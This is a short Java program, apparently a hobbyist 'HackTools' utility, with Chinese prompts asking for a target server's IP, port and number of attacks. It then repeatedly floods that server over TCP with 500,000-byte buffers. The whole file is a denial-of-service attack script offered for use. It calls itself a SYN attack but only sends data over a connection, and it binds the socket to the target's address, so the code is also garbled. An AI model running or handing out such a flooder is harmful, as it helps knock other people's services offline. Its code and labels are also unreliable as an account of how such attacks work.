
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.util.Scanner;

 class t11 {
    public static void main(String[] args) throws IOException, InterruptedException {
		Scanner syn = new Scanner(System.in);
		System.out.println("<===请输入要攻击的服务器IP===>");
		System.out.print("Root@HackTools：>");
		String host = syn.next();
		System.out.println("<===请输入要攻击服务器的端口===>");
		System.out.print("Root@HackTools：>");
		int port = syn.nextInt();
		System.out.println("<===请输入要攻击的次数===>");
		System.out.print("Root@HackTools：>");
		int count = syn.nextInt();
        byte[] buffer = new byte[500000];
        try {
            SocketAddress sockaddr = new InetSocketAddress(host, port);
            Socket socket = new Socket();
            int timeout = 3000;
            socket.bind(sockaddr);
            socket.connect(sockaddr, timeout);
            while (count > 0) {
				System.out.println(count+"次");
				DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());
                dataOutputStream.write(buffer, 0, buffer.length);
                count--;
            }
            System.out.println("发送SYN攻击完毕");
            socket.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
	}
	}
	
